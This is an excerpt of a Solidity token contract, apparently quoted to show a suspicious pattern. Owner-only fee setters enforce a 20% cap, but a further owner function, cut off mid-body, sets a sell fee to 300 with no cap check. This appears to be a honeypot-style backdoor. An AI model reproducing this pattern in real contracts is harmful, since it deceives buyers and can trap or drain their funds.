...
contract SmartContract is Context, IERC20, Ownable {
    ...
    function updateBuyFees(uint256 _buyAutoBurnFee_, uint256 _buyAutoLiquidityFee_, uint256 _buyMarketingFee_) external onlyOwner {
        buyAutoBurnFee = _buyAutoBurnFee_;
        buyAutoLiquidityFee = _buyAutoLiquidityFee_;
        buyMarketingFee = _buyMarketingFee_;
        totalBuyFees = buyAutoBurnFee + buyAutoLiquidityFee + buyMarketingFee;
        require(totalBuyFees <= 20, "Must keep fees at 20% or less");
    }
    
    function updateSellFees(uint256 _sellAutoBurnFee_, uint256 _sellAutoLiquidityFee_, uint256 _sellMarketingFee_) external onlyOwner {
        sellAutoBurnFee = _sellAutoBurnFee_;
        sellAutoLiquidityFee = _sellAutoLiquidityFee_;
        sellMarketingFee = _sellMarketingFee_;
        totalSellFees = sellAutoBurnFee + sellAutoLiquidityFee + sellMarketingFee;
        require(totalSellFees <= 20, "Must keep fees at 20% or less");
    }

    function RervertSellFeestoOriginal() external onlyOwner {
        sellAutoBurnFee = 300;
